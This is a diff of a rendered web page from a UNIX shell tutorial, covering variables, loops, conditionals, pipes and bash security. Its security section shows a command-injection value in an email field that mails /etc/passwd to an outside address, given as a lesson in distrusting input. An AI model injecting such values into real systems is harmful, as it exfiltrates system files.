+<li class="toctree-l3"><a class="reference internal" href="persistent-screen.html#using-k5reauth-to-automatically-refresh-your-kerberos-token">Using k5reauth to automatically refresh your kerberos token</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">More about the UNIX shell</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#types-of-shell">Types of shell</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#manual-pages">Manual pages</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#environment-variables">Environment variables</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#let-s-now-try-the-following-callout">Let’s now try the following: {.callout}</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#variables">Variables</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#differences-among-files">Differences among files</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#looping-over-files">Looping over files</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#conditionals">Conditionals</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#linking-commands">Linking commands</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#pipes-and-redirection">Pipes and redirection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#bash-security">Bash security</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#complexity">Complexity</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#text-viewers">Text viewers</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#text-editors">Text editors</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#disk-space">Disk space</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#over-the-wire-and-bandit-wargame">Over the Wire and Bandit wargame</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../git/README.html">Git</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="../git/01-basics.html">Automated Version Control</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/02-setup.html">Setting Up Git</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/03-create.html">Creating a Repository</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/04-changes.html">Tracking Changes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/05-history.html">Exploring History</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/06-ignore.html">Ignoring Things</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/07-gitlab.html">Remotes in CERN GitLab</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/08-share.html">Sharing a repository with others</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/09-pullrequests.html">Collaborating with Pull Requests</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#what-is-a-pull-or-merge-request">What is a Pull (or Merge) Request</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#fork-the-original-project-repository">Fork the original project repository</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#clone-a-remote-project-and-its-fork">Clone a remote project and its fork</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#sync-your-local-repository-with-remote-changes">Sync your local repository with remote changes</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#implement-your-new-feature">Implement your new feature</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#push-changes">Push changes</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#create-a-pull-or-merge-request">Create a Pull (or Merge) Request</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#discussing-amending-retiring-a-merge-request">Discussing, amending, retiring a Merge Request</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#accepting-a-pull-request">Accepting a Pull Request</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#the-social-side-of-coding">The social side of coding</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../git/09-pullrequests.html#automatic-testing">Automatic testing</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../git/10-conflict.html">Conflicts</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/11-ci.html">GitLab CI</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/12-open.html">Open Science</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/13-licensing.html">Licensing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../git/14-citation.html">Citation</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../CONTRIBUTING.html">Contributing</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="../CONTRIBUTING.html#getting-started">Getting Started</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../CONTRIBUTING.html#dependencies">Dependencies</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../CONTRIBUTING.html#contributing-notebooks">Contributing notebooks</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../CONDUCT.html">Contributor Code of Conduct</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../LICENSE.html">Instructional Material</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../LICENSE.html#software">Software</a></li>
+</ul>
+</li>
+</ul>
+</li>
 </ul>
 
-
-                </nav>
             
-        
-    </div>
+          
+        </div>
+      </div>
+    </nav>
 
-    <div class="book-body">
-        
-            <div class="body-inner">
-                
-                    
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
 
-<div class="book-header" role="navigation">
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Analysis essentials</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
     
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="README.html">UNIX shell</a> &raquo;</li>
+        
+      <li>More about the UNIX shell</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            
+              <a href="https://github.com/hsf-training/analysis-essentials/blob/master/shell-extras/shell2.md" class="fa fa-github"> Edit on GitHub</a>
+            
+          
+        
+      </li>
+    
+  </ul>
 
-    <!-- Title -->
-    <h1>
-        <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >Advanced shell topics</a>
-    </h1>
+  
+  <hr/>
 </div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  
+<style>
+/* CSS overrides for sphinx_rtd_theme */
 
+/* 24px margin */
+.nbinput.nblast,
+.nboutput.nblast {
+    margin-bottom: 19px;  /* padding has already 5px */
+}
 
+/* ... except between code cells! */
+.nblast + .nbinput {
+    margin-top: -19px;
+}
 
+.admonition > p:before {
+    margin-right: 4px;  /* make room for the exclamation icon */
+}
 
-                    <div class="page-wrapper" tabindex="-1" role="main">
-                        <div class="page-inner">
-                            
-<div id="book-search-results">
-    <div class="search-noresults">
-    
-                                <section class="normal markdown-section">
-                                
-                                <h1 id="more-about-the-unix-shell">More about the UNIX shell</h1>
-<h2 id="types-of-shell">Types of shell</h2>
-<p>Several shells are available, the most common ones being probably <code>bash</code> and <code>tcsh</code>.
-In this tutorial, we will always refer to the <code>bash</code> shell, but keep in mind that other shells exist, which may sometimes have different syntax and behaviour!
-To check the type of shell we are using we can type <code>echo</code> to display the value of the <code>$0</code> environment variable:</p>
-<p><code>echo $0</code></p>
-<p>which, if the shell in use is <code>bash</code>, returns</p>
-<pre><code>-bash
-</code></pre><h2 id="manual-pages">Manual pages</h2>
-<p>Each command has a manual page where you can find more information on how to use it. The manual pages can be accessed through the <code>man</code> command, for example:</p>
-<pre><code class="lang-man">man ls
-</code></pre>
-<p>But what if we are looking for a command, but don&#x2019;t know or don&#x2019;t remember its name?
-In this case it might be useful to use the <code>apropos</code> command.
+/* Fix math alignment, see https://github.com/rtfd/sphinx_rtd_theme/pull/686 */
+.math {
+    text-align: unset;
+}
+</style>
+<div class="section" id="more-about-the-unix-shell">
+<h1>More about the UNIX shell<a class="headerlink" href="#more-about-the-unix-shell" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="types-of-shell">
+<h2>Types of shell<a class="headerlink" href="#types-of-shell" title="Permalink to this headline">¶</a></h2>
+<p>Several shells are available, the most common ones being probably <code class="docutils literal notranslate"><span class="pre">bash</span></code> and <code class="docutils literal notranslate"><span class="pre">tcsh</span></code>.
+In this tutorial, we will always refer to the <code class="docutils literal notranslate"><span class="pre">bash</span></code> shell, but keep in mind that other shells exist, which may sometimes have different syntax and behaviour!
+To check the type of shell we are using we can type <code class="docutils literal notranslate"><span class="pre">echo</span></code> to display the value of the <code class="docutils literal notranslate"><span class="pre">$0</span></code> environment variable:</p>
+<p><code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">$0</span></code></p>
+<p>which, if the shell in use is <code class="docutils literal notranslate"><span class="pre">bash</span></code>, returns</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>-bash
+</pre></div>
+</div>
+</div>
+<div class="section" id="manual-pages">
+<h2>Manual pages<a class="headerlink" href="#manual-pages" title="Permalink to this headline">¶</a></h2>
+<p>Each command has a manual page where you can find more information on how to use it. The manual pages can be accessed through the <code class="docutils literal notranslate"><span class="pre">man</span></code> command, for example:</p>
+<div class="highlight-man notranslate"><div class="highlight"><pre><span></span>man ls
+</pre></div>
+</div>
+<p>But what if we are looking for a command, but don’t know or don’t remember its name?
+In this case it might be useful to use the <code class="docutils literal notranslate"><span class="pre">apropos</span></code> command.
 For example, if we want to list the contents of a directory, we could look for something like</p>
-<p><code>apropos &quot;list directory&quot;</code></p>
+<p><code class="docutils literal notranslate"><span class="pre">apropos</span> <span class="pre">&quot;list</span> <span class="pre">directory&quot;</span></code></p>
 <p>which will return a list of (possibly) relevant commands, together with their descriptions.
 In this particular case:</p>
-<pre><code>dir                  (1)  - list directory contents
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>dir                  (1)  - list directory contents
 gfal-ls              (1)  - list directory contents or file information
 ls                   (1)  - list directory contents
 ls                   (1p)  - list directory contents
 vdir                 (1)  - list directory contents
-</code></pre><h2 id="environment-variables">Environment variables</h2>
-<p>In addition to <code>0</code>, some other common examples of environment variables are <code>EDITOR</code>, <code>PATH</code>, and <code>LD_LIBRARY_PATH</code>, whose value can be displayed by</p>
-<pre><code>echo $EDITOR
+</pre></div>
+</div>
+</div>
+<div class="section" id="environment-variables">
+<h2>Environment variables<a class="headerlink" href="#environment-variables" title="Permalink to this headline">¶</a></h2>
+<p>In addition to <code class="docutils literal notranslate"><span class="pre">0</span></code>, some other common examples of environment variables are <code class="docutils literal notranslate"><span class="pre">EDITOR</span></code>, <code class="docutils literal notranslate"><span class="pre">PATH</span></code>, and <code class="docutils literal notranslate"><span class="pre">LD_LIBRARY_PATH</span></code>, whose value can be displayed by</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>echo $EDITOR
 echo $PATH
 echo $LD_LIBRARY_PATH
-</code></pre><p>In particular, the <code>PATH</code> variable specifies in which directories programs can be found (for example, if we type <code>ls</code>, the command <code>ls</code> is searched for in such directories), while the <code>LD_LIBRARY_PATH</code> variable specifies where shared libraries are located.
+</pre></div>
+</div>
+<p>In particular, the <code class="docutils literal notranslate"><span class="pre">PATH</span></code> variable specifies in which directories programs can be found (for example, if we type <code class="docutils literal notranslate"><span class="pre">ls</span></code>, the command <code class="docutils literal notranslate"><span class="pre">ls</span></code> is searched for in such directories), while the <code class="docutils literal notranslate"><span class="pre">LD_LIBRARY_PATH</span></code> variable specifies where shared libraries are located.
 Environment variables can be exported with</p>
-<pre><code>export VARNAME=value
-</code></pre><p>This can be done from the command line or from within a <code>bash</code> script.
-For example, let&apos;s create a <code>bash</code> script named <code>StarWars.sh</code>, having the following lines:</p>
-<pre><code>#!/bin/bash
-echo &quot;Hello Star Wars&apos; world&quot;
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>export VARNAME=value
+</pre></div>
+</div>
+<p>This can be done from the command line or from within a <code class="docutils literal notranslate"><span class="pre">bash</span></code> script.
+For example, let’s create a <code class="docutils literal notranslate"><span class="pre">bash</span></code> script named <code class="docutils literal notranslate"><span class="pre">StarWars.sh</span></code>, having the following lines:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#!/bin/bash
+echo &quot;Hello Star Wars&#39; world&quot;
 export CHARACTER=&quot;Anakin&quot;
-</code></pre><p>After saving and closing, we can run it from the shell with</p>
-<pre><code>bash StarWars.sh
-</code></pre><p>or with</p>
-<pre><code>./StarWars.sh
-</code></pre><p>the latter after changing the file permissions with <code>chmod u+x StarWars.sh</code>, so that the script can actually be executed.
+</pre></div>
+</div>
+<p>After saving and closing, we can run it from the shell with</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>bash StarWars.sh
+</pre></div>
+</div>
+<p>or with</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>./StarWars.sh
+</pre></div>
+</div>
+<p>the latter after changing the file permissions with <code class="docutils literal notranslate"><span class="pre">chmod</span> <span class="pre">u+x</span> <span class="pre">StarWars.sh</span></code>, so that the script can actually be executed.
 The file permissions tell us who is allowed to do what to a given file or directory.
-There are three basic <a href="http://linuxcommand.org/lts0070.php" target="_blank">permission types</a> (read, write, and execute) and three sets of people to be given permissions (owner, users in the group, and users not in the group, where the group is defined for each file or directory and the group membership is configurable).
-The owner and the group can be managed by the <a href="http://www.linfo.org/chown.html" target="_blank"><code>chown</code></a> and <a href="http://www.computerhope.com/unix/uchgrp.htm" target="_blank"><code>chgrp</code></a> commands.</p>
-<p>What happens if we now write <code>echo $CHARACTER</code> in the terminal? Can you explain why?</p>
-<h3 id="lets-now-try-the-following-callout">Let&apos;s now try the following: {.callout}</h3>
-<pre><code>source StarWars.sh
-</code></pre><p>or, equivalently:</p>
-<pre><code>. StarWars.sh
-</code></pre><p>and then</p>
-<pre><code>./StarWars.sh
+There are three basic <a class="reference external" href="http://linuxcommand.org/lc3_lts0090.php">permission types</a> (read, write, and execute) and three sets of people to be given permissions (owner, users in the group, and users not in the group, where the group is defined for each file or directory and the group membership is configurable).
+The owner and the group can be managed by the <a class="reference external" href="http://www.linfo.org/chown.html"><code class="docutils literal notranslate"><span class="pre">chown</span></code></a> and <a class="reference external" href="https://www.computerhope.com/unix/uchgrp.htm"><code class="docutils literal notranslate"><span class="pre">chgrp</span></code></a> commands.</p>
+<p>What happens if we now write <code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">$CHARACTER</span></code> in the terminal? Can you explain why?</p>
+<div class="section" id="let-s-now-try-the-following-callout">
+<h3>Let’s now try the following: {.callout}<a class="headerlink" href="#let-s-now-try-the-following-callout" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>source StarWars.sh
+</pre></div>
+</div>
+<p>or, equivalently:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>. StarWars.sh
+</pre></div>
+</div>
+<p>and then</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>./StarWars.sh
 echo $CHARACTER
-</code></pre><p>Is there any difference?</p>
-<p><code>Exercise (5 min):</code> Change the file permissions so that your friends can read, write, and execute (or not) the <code>StarWars.sh</code> shell script and try to set their Star Wars character to something you like.</p>
-<h2 id="variables">Variables</h2>
-<p>In <code>bash</code>, variables are usually interpreted as strings.
-However, we can do integer arithmetic using the <code>let</code> keyword. Let&apos;s add to <code>StarWars.sh</code> the following lines:</p>
-<pre><code>A=1
+</pre></div>
+</div>
+<p>Is there any difference?</p>
+<p><code class="docutils literal notranslate"><span class="pre">Exercise</span> <span class="pre">(5</span> <span class="pre">min):</span></code> Change the file permissions so that your friends can read, write, and execute (or not) the <code class="docutils literal notranslate"><span class="pre">StarWars.sh</span></code> shell script and try to set their Star Wars character to something you like.</p>
+</div>
+</div>
+<div class="section" id="variables">
+<h2>Variables<a class="headerlink" href="#variables" title="Permalink to this headline">¶</a></h2>
+<p>In <code class="docutils literal notranslate"><span class="pre">bash</span></code>, variables are usually interpreted as strings.
+However, we can do integer arithmetic using the <code class="docutils literal notranslate"><span class="pre">let</span></code> keyword. Let’s add to <code class="docutils literal notranslate"><span class="pre">StarWars.sh</span></code> the following lines:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>A=1
 B=2
 strvar=$A+$B
 let intvar=$A+$B
 echo &quot;strvar is ${strvar}, intvar is ${intvar}&quot;
-</code></pre><p>What can you notice?</p>
-<h2 id="differences-among-files">Differences among files</h2>
-<p>The <code>diff</code> command is used to compare files line by line.
+</pre></div>
+</div>
+<p>What can you notice?</p>
+</div>
+<div class="section" id="differences-among-files">
+<h2>Differences among files<a class="headerlink" href="#differences-among-files" title="Permalink to this headline">¶</a></h2>
+<p>The <code class="docutils literal notranslate"><span class="pre">diff</span></code> command is used to compare files line by line.
 To simply check for differing files:</p>
-<p><code>diff -q file1.dat file2.dat</code></p>
+<p><code class="docutils literal notranslate"><span class="pre">diff</span> <span class="pre">-q</span> <span class="pre">file1.dat</span> <span class="pre">file2.dat</span></code></p>
 <p>To show the output in two columns and suppress the common lines:</p>
-<p><code>diff -y &#x2014;suppress-common-lines file1.dat file2.dat</code></p>
+<p><code class="docutils literal notranslate"><span class="pre">diff</span> <span class="pre">-y</span> <span class="pre">—suppress-common-lines</span> <span class="pre">file1.dat</span> <span class="pre">file2.dat</span></code></p>
 <p>To show the unified diff:</p>
-<p><code>diff -u file1.dat file2.dat</code></p>
-<h2 id="looping-over-files">Looping over files</h2>
+<p><code class="docutils literal notranslate"><span class="pre">diff</span> <span class="pre">-u</span> <span class="pre">file1.dat</span> <span class="pre">file2.dat</span></code></p>
+</div>
+<div class="section" id="looping-over-files">
+<h2>Looping over files<a class="headerlink" href="#looping-over-files" title="Permalink to this headline">¶</a></h2>
 <p>In bash, loops have the following syntax:</p>
-<pre><code>for VARIABLE in LIST
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>for VARIABLE in LIST
 do
   &lt;something&gt;
 done
-</code></pre><p>if the loop has to be repeated a fixed number of times, or:</p>
-<pre><code>while [ EXPRESSION ]
+</pre></div>
+</div>
+<p>if the loop has to be repeated a fixed number of times, or:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>while [ EXPRESSION ]
 do
   &lt;something&gt;
 done
-</code></pre><p>if the loop has to be repeated until a condition is fulfilled.</p>
-<h2 id="conditionals">Conditionals</h2>
+</pre></div>
+</div>
+<p>if the loop has to be repeated until a condition is fulfilled.</p>
+</div>
+<div class="section" id="conditionals">
+<h2>Conditionals<a class="headerlink" href="#conditionals" title="Permalink to this headline">¶</a></h2>
 <p>Conditionals have the following syntax:</p>
-<pre><code>if [ COND1 ]
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>if [ COND1 ]
 then
     echo &quot;COND1 evaluated to true&quot;
 elif [COND2 ]
@@ -850,216 +591,229 @@ then
 else
     echo &quot;Test not passed&quot;
 fi
-</code></pre><p><code>Exercise (5 min):</code> Create a text file and then write a script that checks whether the text file</p>
-<ul>
-<li>exists;</li>
-<li>is readable;</li>
-<li>is newer than another text file.</li>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">Exercise</span> <span class="pre">(5</span> <span class="pre">min):</span></code> Create a text file and then write a script that checks whether the text file</p>
+<ul class="simple">
+<li><p>exists;</p></li>
+<li><p>is readable;</p></li>
+<li><p>is newer than another text file.</p></li>
 </ul>
-<p><code>Exercise (5 min):</code> In the <code>StarWars.sh</code> script, add some lines to check whether</p>
-<ul>
-<li><code>A</code> is equal to <code>B</code>;</li>
-<li><code>A</code> is smaller than <code>B</code>;</li>
-<li><code>A</code> is larger than <code>B</code>.
-Be careful! We might be tempted to use <code>&gt;</code> and <code>&lt;</code> inside the shell script, but they actually havea a different meaning for the shell, so <code>lt</code> and <code>gt</code> should be used instead.</li>
+<p><code class="docutils literal notranslate"><span class="pre">Exercise</span> <span class="pre">(5</span> <span class="pre">min):</span></code> In the <code class="docutils literal notranslate"><span class="pre">StarWars.sh</span></code> script, add some lines to check whether</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">A</span></code> is equal to <code class="docutils literal notranslate"><span class="pre">B</span></code>;</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">A</span></code> is smaller than <code class="docutils literal notranslate"><span class="pre">B</span></code>;</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">A</span></code> is larger than <code class="docutils literal notranslate"><span class="pre">B</span></code>.
+Be careful! We might be tempted to use <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> and <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> inside the shell script, but they actually havea a different meaning for the shell, so <code class="docutils literal notranslate"><span class="pre">lt</span></code> and <code class="docutils literal notranslate"><span class="pre">gt</span></code> should be used instead.</p></li>
 </ul>
-<h2 id="linking-commands">Linking commands</h2>
-<p>Let us consider the three following lines, in which we link the commands to list the files in the <code>Poems</code> and <code>Recipes</code> folders through the <code>;</code>, <code>&amp;&amp;</code>, or <code>||</code> operators:</p>
-<pre><code>ls Poems/*.txt; ls Recipes/*.txt
+</div>
+<div class="section" id="linking-commands">
+<h2>Linking commands<a class="headerlink" href="#linking-commands" title="Permalink to this headline">¶</a></h2>
+<p>Let us consider the three following lines, in which we link the commands to list the files in the <code class="docutils literal notranslate"><span class="pre">Poems</span></code> and <code class="docutils literal notranslate"><span class="pre">Recipes</span></code> folders through the <code class="docutils literal notranslate"><span class="pre">;</span></code>, <code class="docutils literal notranslate"><span class="pre">&amp;&amp;</span></code>, or <code class="docutils literal notranslate"><span class="pre">||</span></code> operators:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>ls Poems/*.txt; ls Recipes/*.txt
 ls Poems/*.txt &amp;&amp; ls Recipes/*.txt
 ls Poems/*.txt || ls Recipes/*.txt
-</code></pre><p>The <code>;</code> means execute the first, then the second; the <code>&amp;&amp;</code> means execute the first, then the second if the first was successful, while the <code>||</code> means execute the first, then the second if the first was not successful.</p>
-<h2 id="pipes-and-redirection">Pipes and redirection</h2>
+</pre></div>
+</div>
+<p>The <code class="docutils literal notranslate"><span class="pre">;</span></code> means execute the first, then the second; the <code class="docutils literal notranslate"><span class="pre">&amp;&amp;</span></code> means execute the first, then the second if the first was successful, while the <code class="docutils literal notranslate"><span class="pre">||</span></code> means execute the first, then the second if the first was not successful.</p>
+</div>
+<div class="section" id="pipes-and-redirection">
+<h2>Pipes and redirection<a class="headerlink" href="#pipes-and-redirection" title="Permalink to this headline">¶</a></h2>
 <p>We already saw how to chain commands together, for example using the pipe to redirect the output of a command to a file or to feed it to another command.</p>
-<p><code>Exercise (5 min)</code>: Save in a file the lines containing the word &quot;force&quot; searching for them in all the files in the <code>Material/StarWars</code> folder.</p>
+<p><code class="docutils literal notranslate"><span class="pre">Exercise</span> <span class="pre">(5</span> <span class="pre">min)</span></code>: Save in a file the lines containing the word “force” searching for them in all the files in the <code class="docutils literal notranslate"><span class="pre">Material/StarWars</span></code> folder.</p>
 <p>Solution:</p>
-<pre><code>files=`ls StarWars/*.txt`
-for file in $files; do grep &#x2014;color -w &quot;force&quot; $file &gt;&gt; Sentences.dat; done
-</code></pre><p><code>Exercise (5 min):</code> Now do the same, but searching for a string provided by the user.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>files=`ls StarWars/*.txt`
+for file in $files; do grep —color -w &quot;force&quot; $file &gt;&gt; Sentences.dat; done
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">Exercise</span> <span class="pre">(5</span> <span class="pre">min):</span></code> Now do the same, but searching for a string provided by the user.</p>
 <p>Solution:</p>
 <p>There are two ways to supply inputs to a shell script.</p>
-<p>Open <code>StarWars.sh</code> and add the following lines</p>
-<pre><code>files=`ls StarWars/*.txt`
-echo &quot;Enter the string to be looked for&#x2026;&quot;
+<p>Open <code class="docutils literal notranslate"><span class="pre">StarWars.sh</span></code> and add the following lines</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>files=`ls StarWars/*.txt`
+echo &quot;Enter the string to be looked for…&quot;
 read string
 echo &quot;Looking for: ${string}&quot;
-for file in $files; do grep &#x2014;color -w $string $file &gt;&gt; Sentences2.dat; done
-</code></pre><p>Another solution is to replace the lines above with</p>
-<pre><code>files=`ls StarWars/*.txt`
+for file in $files; do grep —color -w $string $file &gt;&gt; Sentences2.dat; done
+</pre></div>
+</div>
+<p>Another solution is to replace the lines above with</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>files=`ls StarWars/*.txt`
 string=$1
 echo &quot;Looking for: ${string}&quot;
-for file in $files; do grep &#x2014;color -w $string $file &gt;&gt; Sentences2.dat; done
-</code></pre><p>where command line arguments are used, and run again with</p>
-<pre><code>. StarWars.sh
-</code></pre><p>and</p>
-<pre><code>. StarWars.sh force
-</code></pre><p>It must be noticed that the first argument is saved in the <code>$1</code> variable. What is, then, <code>$0</code>? This is the name of the shell script! And what is <code>$#</code>? This is the number of parameters!</p>
+for file in $files; do grep —color -w $string $file &gt;&gt; Sentences2.dat; done
+</pre></div>
+</div>
+<p>where command line arguments are used, and run again with</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>. StarWars.sh
+</pre></div>
+</div>
+<p>and</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>. StarWars.sh force
+</pre></div>
+</div>
+<p>It must be noticed that the first argument is saved in the <code class="docutils literal notranslate"><span class="pre">$1</span></code> variable. What is, then, <code class="docutils literal notranslate"><span class="pre">$0</span></code>? This is the name of the shell script! And what is <code class="docutils literal notranslate"><span class="pre">$#</span></code>? This is the number of parameters!</p>
 <p>What happens if we do not provide any argument?
 We need to check that the string has been assigned, which can be done by adding</p>
-<pre><code>if [ -n &quot;${string}&quot; ]
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>if [ -n &quot;${string}&quot; ]
 then
-    for file in $files; do grep &#x2014;color -w $string $file &gt;&gt; Sentences.dat; done
+    for file in $files; do grep —color -w $string $file &gt;&gt; Sentences.dat; done
 else
     echo &quot;No string provided.&quot;
     return
 fi
-</code></pre><p>What happens if we use <code>exit</code> instead of <code>return</code>?</p>
-<p>Another useful command worth mentioning is <code>tee</code>, which allows to save the output into a file, but also to show it on the stdout (our screen):</p>
-<p><code>ls Poems/*.txt | tee ListOfFilesWithTee.dat</code></p>
-<p>If we want to append to the output file, we can use the <code>-a</code> option:</p>
-<p><code>ls Poems/*.txt | tee -a ListOfFilesWithTee.dat</code></p>
-<h2 id="bash-security">Bash security</h2>
-<p><a href="http://i.stack.imgur.com/MI1tR.jpg" target="_blank">Situations that can turn very wrong very quickly</a>, which means it is important to be aware of potentially dangerous behaviours.</p>
+</pre></div>
+</div>
+<p>What happens if we use <code class="docutils literal notranslate"><span class="pre">exit</span></code> instead of <code class="docutils literal notranslate"><span class="pre">return</span></code>?</p>
+<p>Another useful command worth mentioning is <code class="docutils literal notranslate"><span class="pre">tee</span></code>, which allows to save the output into a file, but also to show it on the stdout (our screen):</p>
+<p><code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">Poems/*.txt</span> <span class="pre">|</span> <span class="pre">tee</span> <span class="pre">ListOfFilesWithTee.dat</span></code></p>
+<p>If we want to append to the output file, we can use the <code class="docutils literal notranslate"><span class="pre">-a</span></code> option:</p>
+<p><code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">Poems/*.txt</span> <span class="pre">|</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">ListOfFilesWithTee.dat</span></code></p>
+</div>
+<div class="section" id="bash-security">
+<h2>Bash security<a class="headerlink" href="#bash-security" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="http://i.stack.imgur.com/MI1tR.jpg">Situations that can turn very wrong very quickly</a>, which means it is important to be aware of potentially dangerous behaviours.</p>
 <p>It is a good practice to not trust input data, which is one of the most common reasons of security-related incidents.
 Some examples are buffer overflow (that is, accepting input longer than the size of the allocated memory), invalid or malicious input, code inside data, and many others.</p>
-<p>One practical example, provided by Sebastian Lopienski, is the following: let&apos;s say we wrote a script that sends emails using the <code>mail</code> command:</p>
-<p><code>cat confirmation.txt | mail $email</code></p>
+<p>One practical example, provided by Sebastian Lopienski, is the following: let’s say we wrote a script that sends emails using the <code class="docutils literal notranslate"><span class="pre">mail</span></code> command:</p>
+<p><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">confirmation.txt</span> <span class="pre">|</span> <span class="pre">mail</span> <span class="pre">$email</span></code></p>
 <p>and someone provides the following email address:</p>
-<p><code>me@fake.com; cat /etc/passwd | mail me@real.com</code></p>
+<p><code class="docutils literal notranslate"><span class="pre">me&#64;fake.com;</span> <span class="pre">cat</span> <span class="pre">/etc/passwd</span> <span class="pre">|</span> <span class="pre">mail</span> <span class="pre">me&#64;real.com</span></code></p>
 <p>So, what do we get?</p>
-<pre><code>cat confirmation.txt | mail me@fake.com;
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>cat confirmation.txt | mail me@fake.com;
 cat /etc/passwd | mail me@real.com
-</code></pre><p>Great!</p>
-<h2 id="complexity">Complexity</h2>
-<p>Bash is great until a certain level of complexity is reached&#x2026;so try to keep it simple!
-What about <a href="http://lhcb-release-area.web.cern.ch/LHCb-release-area/DOC/online/releases/v4r65/doxygen/df/dd9/src_2_lineshape_maker_8cpp__incl.png" target="_blank">this</a>?</p>
